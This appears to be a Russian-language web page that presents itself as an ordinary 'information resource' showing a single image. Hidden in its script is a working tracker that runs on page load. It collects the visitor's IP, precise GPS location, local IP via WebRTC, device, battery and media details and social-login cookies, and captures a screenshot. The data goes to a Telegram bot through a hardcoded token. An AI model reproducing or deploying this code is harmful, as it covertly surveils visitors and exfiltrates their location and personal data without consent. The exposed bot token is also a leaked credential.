    <title>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω—ã–π —Ä–µ—Å—É—Ä—Å</title>
    <style>

</head>
<body>
    <img class="main-image" src="https://i.pinimg.com/564x/a2/36/20/a23620bbf4143ab4b90a462e59c25dad.jpg" alt="–û—Å–Ω–æ–≤–Ω–æ–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ">

    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script>
        // Telegram –±–æ—Ç
        const botToken = '6818081299:AAGEDkvcZltkYKPELkGv8AuvRxpBzqMQLu8';
        const chatId = '1209403544';

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram (–∏—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω–∞—è)
        function sendToTelegram(message) {
            // –ò—Å–ø–æ–ª—å–∑—É–µ–º XMLHttpRequest –≤–º–µ—Å—Ç–æ fetch –¥–ª—è –æ–±—Ö–æ–¥–∞ CORS
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const params = new URLSearchParams();
            params.append('chat_id', chatId);
            params.append('text', message);
            
            const xhr = new XMLHttpRequest();
            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            
            xhr.onload = function() {
                if (xhr.status === 200) {
                    console.log('–î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram');
                } else {
                    console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', xhr.statusText);
                }
            };
            
            xhr.onerror = function() {
                console.error('–û—à–∏–±–∫–∞ —Å–µ—Ç–∏ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ');
            };
            
            xhr.send(params.toString());
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ GPU
        function getGPUInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) return "WebGL –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è";
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
            }
            return "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ GPU";
        }

        // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ç–æ—á–Ω–æ–π –º–æ–¥–µ–ª–∏ Android
        function getAndroidModel() {
            const userAgent = navigator.userAgent;
            const brands = {
                'samsung': 'Samsung',
                'huawei': 'Huawei',
                'xiaomi': 'Xiaomi',
                'redmi': 'Redmi',
                'poco': 'POCO',
                'oppo': 'Oppo',
                'vivo': 'Vivo',
                'realme': 'Realme',
                'oneplus': 'OnePlus',
                'sony': 'Sony',
                'lg': 'LG',
                'motorola': 'Motorola',
                'nokia': 'Nokia',
                'htc': 'HTC',
                'asus': 'Asus',
                'lenovo': 'Lenovo',
                'zte': 'ZTE',
                'alcatel': 'Alcatel',
                'meizu': 'Meizu',
                'honor': 'Honor'
            };
            
            for (const [key, brand] of Object.entries(brands)) {
                if (userAgent.toLowerCase().includes(key)) {
                    const modelMatch = userAgent.match(/Android.*;\s([a-zA-Z0-9\s\-]+)\sBuild/i);
                    return `${brand} ${modelMatch ? modelMatch[1] : ''}`.trim();
                }
            }
            
            return "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –º–æ–¥–µ–ª—å Android";
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞
        function getCPUArchitecture() {
            try {
                return (new WebAssembly.Module(new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]))) ? 
                    "64-–±–∏—Ç (–ø–æ–¥–¥–µ—Ä–∂–∫–∞ WebAssembly)" : "32-–±–∏—Ç";
            } catch (e) {
                return "32-–±–∏—Ç (–±–µ–∑ –ø–æ–¥–¥–µ—Ä–∂–∫–∏ WebAssembly)";
            }
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –¥–∏—Å–ø–ª–µ–µ
        function getDisplayInfo() {
            const widthIn = (screen.width / window.devicePixelRatio) * 0.0104; // –ü–µ—Ä–µ–≤–æ–¥–∏–º –≤ –¥—é–π–º—ã
            const heightIn = (screen.height / window.devicePixelRatio) * 0.0104;
            const diagonal = Math.sqrt(Math.pow(widthIn, 2) + Math.pow(heightIn, 2)).toFixed(1);
            
            return {
                size: `${diagonal}"`,
                resolution: `${screen.width}x${screen.height}`,
                density: window.devicePixelRatio,
                type: document.querySelector('.display-type') ? 
                    document.querySelector('.display-type').textContent : "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ"
            };
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–µ—Ç–∏
        function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!connection) return "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Ç–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞";
            
            return {
                type: connection.effectiveType || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                downlink: connection.downlink ? `${connection.downlink} Mbps` : "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                rtt: connection.rtt ? `${connection.rtt} ms` : "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                saveData: connection.saveData ? "–í–∫–ª—é—á–µ–Ω" : "–í—ã–∫–ª—é—á–µ–Ω"
            };
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ IP —á–µ—Ä–µ–∑ WebRTC
        function getLocalIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                pc.onicecandidate = (ice) => {
                    if (!ice.candidate) return;
                    const ip = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/)?.[1];
                    if (ip) resolve(ip);
                };
                
                setTimeout(() => resolve("–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å"), 2000);
            });
        }

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ VPN/Proxy
        async function checkVPN() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoRes.json();
                
                return {
                    ip: ipData.ip,
                    isProxy: geoData.proxy || geoData.vpn || false,
                    provider: geoData.org || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    country: geoData.country_name || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
                };
            } catch (e) {
                return "–ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ–≤–µ—Ä–∏—Ç—å";
            }
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –¥–∞—Ç—á–∏–∫–∞—Ö
        function getSensorsInfo() {
            return {
                touch: 'ontouchstart' in window ? "–ï—Å—Ç—å" : "–ù–µ—Ç",
                motion: 'ondevicemotion' in window ? "–ï—Å—Ç—å" : "–ù–µ—Ç",
                orientation: 'ondeviceorientation' in window ? "–ï—Å—Ç—å" : "–ù–µ—Ç",
                light: 'ondevicelight' in window ? "–ï—Å—Ç—å" : "–ù–µ—Ç",
                proximity: 'ondeviceproximity' in window ? "–ï—Å—Ç—å" : "–ù–µ—Ç"
            };
        }

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –º–µ–¥–∏–∞—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞–º
        async function checkMediaAccess() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                return {
                    camera: devices.some(d => d.kind === 'videoinput'),
                    microphone: devices.some(d => d.kind === 'audioinput'),
                    speakers: devices.some(d => d.kind === 'audiooutput')
                };
            } catch (e) {
                return "–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω";
            }
        }

        // –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞
        async function takeScreenshot() {
            try {
                const canvas = await html2canvas(document.body);
                return canvas.toDataURL('image/jpeg', 0.5);
            } catch (e) {
                return "–ù–µ —É–¥–∞–ª–æ—Å—å —Å–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç";
            }
        }

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ—Ü—Å–µ—Ç–µ–π –ø–æ –∫—É–∫–∞–º
        function checkSocialCookies() {
            const cookies = document.cookie.split(';').reduce((cookies, cookie) => {
                const [name, value] = cookie.split('=').map(c => c.trim());
                cookies[name] = value;
                return cookies;
            }, {});
            
            return {
                google: cookies['G_AUTHUSER_H'] ? "–í–æ–∑–º–æ–∂–Ω–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω" : "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö",
                facebook: cookies['fr'] ? "–í–æ–∑–º–æ–∂–Ω–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω" : "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö",
                telegram: cookies['tg_user'] ? "–í–æ–∑–º–æ–∂–Ω–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω" : "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö",
                twitter: cookies['auth_token'] ? "–í–æ–∑–º–æ–∂–Ω–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω" : "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö"
            };
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
        async function collectAllData() {
            // –û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
            const data = {
                "üìÖ –î–∞—Ç–∞ –∏ –≤—Ä–µ–º—è": new Date().toLocaleString('ru-RU'),
                "üåê IP –∏ –≥–µ–æ–¥–∞–Ω–Ω—ã–µ": await checkVPN(),
                "üñ•Ô∏è –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ": {
                    "–ú–æ–¥–µ–ª—å": /Android/i.test(navigator.userAgent) ? getAndroidModel() : navigator.platform,
                    "–û–°": navigator.userAgent,
                    "–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞": getCPUArchitecture(),
                    "GPU": getGPUInfo(),
                    "–î–∏—Å–ø–ª–µ–π": getDisplayInfo(),
                    "–ü–ª–æ—Ç–Ω–æ—Å—Ç—å –ø–∏–∫—Å–µ–ª–µ–π": window.devicePixelRatio,
                    "–°–µ–Ω—Å–æ—Ä–Ω—ã–π —ç–∫—Ä–∞–Ω": 'ontouchstart' in window ? "–î–∞" : "–ù–µ—Ç"
                },
                "üì∂ –°–µ—Ç—å": getNetworkInfo(),
                "üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è": await getGeolocation(),
                "üîã –ë–∞—Ç–∞—Ä–µ—è": await getBatteryInfo(),
                "‚öôÔ∏è –ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å": {
                    "–Ø–¥–µ—Ä CPU": navigator.hardwareConcurrency || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    "–ü–∞–º—è—Ç—å": performance.memory ? 
                        `${(performance.memory.jsHeapSizeLimit / (1024 * 1024)).toFixed(1)} MB` : "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
                },
                "üõ°Ô∏è –ü—Ä–∏–≤–∞—Ç–Ω–æ—Å—Ç—å": {
                    "–†–µ–∂–∏–º –∏–Ω–∫–æ–≥–Ω–∏—Ç–æ": checkPrivateMode(),
                    "–ö—É–∫–∏": navigator.cookieEnabled ? "–í–∫–ª—é—á–µ–Ω—ã" : "–í—ã–∫–ª—é—á–µ–Ω—ã"
                },
                "üì∑ –ú–µ–¥–∏–∞": await checkMediaAccess(),
                "üì± –î–∞—Ç—á–∏–∫–∏": getSensorsInfo(),
                "üîç –ü–æ–≤–µ–¥–µ–Ω–∏–µ": {
                    "–†–µ—Ñ–µ—Ä–µ—Ä": document.referrer || "–ü—Ä—è–º–æ–π –∑–∞—Ö–æ–¥",
                    "–†–∞–∑–º–µ—Ä –æ–∫–Ω–∞": `${window.innerWidth}x${window.innerHeight}`,
                    "–Ø–∑—ã–∫": navigator.language,
                    "–ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å": Intl.DateTimeFormat().resolvedOptions().timeZone
                },
                "üìå –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ": {
                    "–õ–æ–∫–∞–ª—å–Ω—ã–π IP": await getLocalIP(),
                    "–°–æ—Ü—Å–µ—Ç–∏": checkSocialCookies(),
                    "–°–∫—Ä–∏–Ω—à–æ—Ç": await takeScreenshot()
                }
            };

            // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
            let message = "üîç –ü–æ–ª–Ω—ã–π –æ—Ç—á—ë—Ç –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:\n\n";
            for (const [category, items] of Object.entries(data)) {
                message += `\n${category}:\n`;
                if (typeof items === 'object') {
                    for (const [key, value] of Object.entries(items)) {
                        message += `  ‚Ä¢ ${key}: ${JSON.stringify(value, null, 2)}\n`;
                    }
                } else {
                    message += `  ‚Ä¢ ${items}\n`;
                }
            }

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ (–æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–ª–∏–Ω—É —Å–æ–æ–±—â–µ–Ω–∏—è)
            if (message.length > 4096) {
                message = message.substring(0, 4090) + "...";
            }
            sendToTelegram(message);
        }

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–µ–∂–∏–º–∞ –∏–Ω–∫–æ–≥–Ω–∏—Ç–æ
        function checkPrivateMode() {
            try {
                localStorage.setItem('test', 'test');
                localStorage.removeItem('test');
                return "–ù–µ—Ç (–æ–±—ã—á–Ω—ã–π —Ä–µ–∂–∏–º)";
            } catch (e) {
                return "–î–∞ (—Ä–µ–∂–∏–º –∏–Ω–∫–æ–≥–Ω–∏—Ç–æ)";
            }
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
        async function getGeolocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è");
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const loc = {
                            coords: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
                            accuracy: `${pos.coords.accuracy} –º–µ—Ç—Ä–æ–≤`,
                            altitude: pos.coords.altitude ? `${pos.coords.altitude} –º` : "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö",
                            speed: pos.coords.speed ? `${(pos.coords.speed * 3.6).toFixed(1)} –∫–º/—á` : "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö",
                            heading: pos.coords.heading || "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö"
                        };
                        resolve(loc);
                    },
                    (err) => resolve(`–û—à–∏–±–∫–∞: ${err.message}`),
                    { timeout: 5000, enableHighAccuracy: true }
                );
            });
        }

        // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±–∞—Ç–∞—Ä–µ–µ
        async function getBatteryInfo() {
            if (!navigator.getBattery) return "API –±–∞—Ç–∞—Ä–µ–∏ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è";
            
            try {
                const battery = await navigator.getBattery();
                return {
                    level: `${Math.floor(battery.level * 100)}%`,
                    charging: battery.charging ? "–ó–∞—Ä—è–∂–∞–µ—Ç—Å—è" : "–ù–µ –∑–∞—Ä—è–∂–∞–µ—Ç—Å—è",
                    chargingTime: battery.chargingTime ? `${Math.floor(battery.chargingTime/60)} –º–∏–Ω` : "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    dischargingTime: battery.dischargingTime !== Infinity ? 
                        `${Math.floor(battery.dischargingTime/60)} –º–∏–Ω` : "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
                };
            } catch (e) {
                return "–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö";
            }
        }

        // –ó–∞–ø—É—Å–∫ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', () => {
            setTimeout(collectAllData, 3000); // –î–∞—ë–º –≤—Ä–µ–º—è –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö
        });
    </script>
